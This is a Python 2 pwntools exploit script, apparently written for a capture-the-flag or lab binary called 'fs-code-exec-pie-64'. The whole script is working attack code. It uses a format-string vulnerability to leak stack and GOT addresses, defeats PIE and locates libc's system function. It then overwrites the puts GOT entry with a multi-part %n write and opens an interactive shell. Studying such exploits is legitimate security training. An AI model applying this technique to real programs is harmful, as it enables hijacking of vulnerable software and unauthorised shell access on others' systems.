#!/usr/bin/env python
from pwn import *
env = { 'PATH' : '.:/bin:/usr/bin' }
p = process("./fs-code-exec-pie-64", env = env)

p.sendline('%1$p %2$p')

print p.recvline()
data = p.recvline()
print(data)
got_data = int(data[6:20],16)
print("Got of data %s" % hex(got_data))
addr_data = int(data[21:35],16)
print("System of data %s" % hex(addr_data))
base = got_data - 0xd11
print("Base of data %s" % hex(base))
got_of_printf = base + 0x202030
print("Got of printf %s" % hex(got_of_printf))
got_of_puts = base + 0x202020
print("Got of puts %s" % hex(got_of_puts))
print p.recv()

buf = "%7$sBBBB" + p64(got_of_puts)
p.sendline(buf)
data = p.recvline()
print(data)
raw_data = data[14:20]
print(repr(raw_data))
raw_data = raw_data + "\x00\x00"
new_data = u64(raw_data)
print(hex(new_data))
offset = 0x7fc667815690 - 0x7fc6677eb390  # puts  - system
print("Offset %s" % offset)
libc_system = new_data - offset
print("Libc of system %s" % hex(libc_system))
print p.recv()

target = hex(libc_system)
lower = int(target,16) & 0xffff
mid = ((int(target,16) >> 16) & 0xffffffff) & 0xffff
higher = (((int(target,16) >> 16) & 0xffffffff) >> 16) & 0xffff
first = lower
second = mid + 0x10000 - lower
third = higher + 0x10000 - mid

print(hex(lower))
print(hex(mid))
print(hex(higher))
print(first)
print(second)
print(third)

total = 22 + len(str(first)) + len(str(second)) + len(str(third))
print(total)
count = 8 - (total % 8)
print(count)

value = ""
value += "%"+ str(first) + "x" + "%11$n"
value += "%"+ str(second) + "x" + "%12$n"
value += "%"+ str(third) + "x" + "%13$hn" + "A" * count
value += p64(got_of_puts) + p64(got_of_puts + 2) + p64(got_of_puts + 4)

p.sendline(value)
print p.recv()
p.interactive()
